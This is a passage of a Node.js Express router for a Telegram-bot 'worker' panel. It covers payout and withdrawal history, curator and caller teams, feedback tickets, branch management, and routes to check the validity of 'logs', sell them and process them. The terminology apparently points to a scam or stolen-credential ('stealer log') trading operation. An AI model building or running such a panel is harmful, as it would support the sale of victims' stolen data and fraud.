              counterpartyTelegramId: p.counterpartyTelegramId || "",
              counterpartyUsername: p.counterpartyUsername || "",
            };
          }),
          page: meta.page,
          pageCount: meta.pageCount,
          total: meta.total,
          limit,
        });
      }

      if (tab === "withdrawals") {
        const total = await countUserRequests(req.worker.telegramId);
        const meta = pageMeta(total);
        const rows = await listUserRequests(req.worker.telegramId, limit, meta.skip);
        return res.json({
          tab,
          items: (rows || []).map((r) => ({
            id: String(r._id || ""),
            createdAt: r.createdAt || null,
            amountUsd: Number(r.amountUsd || 0),
            method: r.method || "",
            walletAddress: r.walletAddress || "",
            status: r.status || "pending",
            payoutUrl: r.payoutUrl || "",
            type: "withdrawal",
          })),
          page: meta.page,
          pageCount: meta.pageCount,
          total: meta.total,
          limit,
        });
      }

      if (tab === "transfers") {
        const total = await countUserTransfers(req.worker.telegramId);
        const meta = pageMeta(total);
        const rows = await listUserTransfers(req.worker.telegramId, limit, meta.skip);
        return res.json({
          tab,
          items: (rows || []).map((r) => serializeTransferForUser(r, req.worker.telegramId)),
          page: meta.page,
          pageCount: meta.pageCount,
          total: meta.total,
          limit,
        });
      }

      return res.status(400).json({ error: "unknown_history_tab" });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/team/curators", requireWorker, async (_req, res) => {
    try {
      const curators = await listCurators();
      return res.json({
        roleType: "curator",
        members: (curators || []).map((u) => serializeCuratorLike(u, { roleType: "curator" })),
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/team/callers", requireWorker, async (_req, res) => {
    try {
      const callers = await listCallers();
      return res.json({
        roleType: "caller",
        members: (callers || []).map((u) => serializeCuratorLike(u, { roleType: "caller" })),
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/team/curators/:telegramId/apply", requireWorker, async (req, res) => {
    try {
      const curatorTelegramId = String(req.params.telegramId || "").trim();
      if (!curatorTelegramId) return res.status(400).json({ error: "curator_id_required" });

      const curator = await getUserByTelegramId(curatorTelegramId);
      if (!curator?.isCurator) return res.status(400).json({ error: "curator_not_found" });

      // createCuratorApplication() сам валидирует дубликаты и привязки.
      const application = await createCuratorApplication(req.worker, curator);

      if (bot?.telegram?.sendMessage) {
        try {
          await bot.telegram.sendMessage(
            curator.telegramId,
            buildCuratorApplicationNotifyHtml(req.worker),
            {
              parse_mode: "HTML",
              reply_markup: curatorApplicationModerationKeyboard(application._id.toString()).reply_markup,
            }
          );
        } catch (e) {
          // Уведомление куратору вторично — заявку всё равно создаём.
        }
      }

      return res.json({ ok: true, applicationId: String(application._id) });
    } catch (error) {
      return res.status(400).json({ error: error.message || "curator_apply_failed" });
    }
  });

  router.get("/feedback", requireWorker, async (req, res) => {
    try {
      const limit = Math.min(50, Math.max(1, Number(req.query.limit || 20)));
      const rows = await listUserFeedback(req.worker.telegramId, limit);
      return res.json({
        items: (rows || []).map((t) => ({
          id: String(t._id || ""),
          type: t.type || "",
          text: String(t.text || ""),
          status: t.status || "open",
          adminReply: String(t.adminReply || ""),
          createdAt: t.createdAt || null,
        })),
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/feedback", requireWorker, async (req, res) => {
    try {
      const type = String(req.body?.type || "").trim();
      const text = String(req.body?.text || "").trim();
      const ticket = await createFeedback(req.worker, { type, text });

      if (bot?.telegram) {
        await notifyAdminsAboutFeedback(bot.telegram, ticket);
      }

      return res.json({ ok: true, ticketId: String(ticket._id) });
    } catch (error) {
      return res.status(400).json({ error: error.message || "feedback_failed" });
    }
  });

  router.get("/logs/:sourceId", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      res.json(await getLogDetail(req.worker, sourceId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/logs/:sourceId/check-valid", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      res.json(await requestCheckValid(req.worker, sourceId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/logs/:sourceId/check-valid", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      const taskId = String(req.query.taskId || "").trim();
      res.json(await pollCheckValidStatus(req.worker, sourceId, taskId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/logs/:sourceId/refresh", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      res.json(await refreshLogDetail(req.worker, sourceId));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/logs/:sourceId/sell", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      const log = await requestSell({ telegram: bot.telegram }, req.worker, sourceId);
      return res.json({
        ok: true,
        saleStatus: log.saleStatus || "none",
      });
    } catch (error) {
      return res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/logs/:sourceId/process", requireWorker, async (req, res) => {
    try {
      const sourceId = String(req.params.sourceId || "").trim();
      const log = await requestProcess({ telegram: bot.telegram }, req.worker, sourceId);
      return res.json({
        ok: true,
        processStatus: log.processStatus || "none",
      });
    } catch (error) {
      return res.status(error.status || 400).json({ error: error.message });
    }
  });

  const panelBranch = require("../services/panelBranchService");

  router.get("/branch/me", requireWorker, async (req, res) => {
    try {
      res.json(await panelBranch.getBranchMe(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/branch/catalog", requireWorker, async (req, res) => {
    try {
      res.json(await panelBranch.getBranchCatalog(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/branch/overview", requireWorker, async (req, res) => {
    try {
      res.json(await panelBranch.getBranchOverview(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/branch/members", requireWorker, async (req, res) => {
    try {
      res.json(await panelBranch.getBranchMembersPayload(req.worker));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/branch", requireWorker, async (req, res) => {
    try {
      const branch = await panelBranch.createBranchFromPanel(req.worker, req.body || {});
      res.json({ ok: true, branch });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.patch("/branch", requireWorker, async (req, res) => {
    try {
      const branch = await panelBranch.patchOwnBranch(req.worker, req.body || {});
      res.json({ ok: true, branch });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/branch/applications", requireWorker, async (req, res) => {
    try {
      const branchId = String(req.body?.branchId || "").trim();
      const application = await panelBranch.applyToBranch(req.worker, branchId);
      res.json({ ok: true, application });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/branch/applications/:id", requireWorker, async (req, res) => {
    try {
      await panelBranch.cancelBranchApplication(req.worker.telegramId, req.params.id);
      res.json({ ok: true });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/branch/applications", requireWorker, async (req, res) => {
    try {
      await panelBranch.cancelOwnPendingApplication(req.worker.telegramId);
      res.json({ ok: true });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/branch/applications/:id/accept", requireWorker, async (req, res) => {
    try {
      const result = await panelBranch.acceptBranchApplication(
        req.params.id,
        req.worker.telegramId
      );
      res.json({
        ok: true,
        applicationId: String(result.app._id),
        memberTelegramId: String(result.applicant.telegramId),
      });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/branch/applications/:id/reject", requireWorker, async (req, res) => {
    try {
      await panelBranch.rejectBranchApplication(req.params.id, req.worker.telegramId);
      res.json({ ok: true });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/branch/membership", requireWorker, async (req, res) => {
    try {
      await panelBranch.leaveBranch(req.worker);
      res.json({ ok: true });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/branch", requireWorker, async (req, res) => {
    try {
      await panelBranch.deleteOwnBranch(req.worker);
      res.json({ ok: true });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/branch/members/:telegramId", requireWorker, async (req, res) => {
    try {
      await panelBranch.kickBranchMember(req.worker.telegramId, req.params.telegramId);
      res.json({ ok: true });
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  return router;
}

module.exports = { createUserRouter };
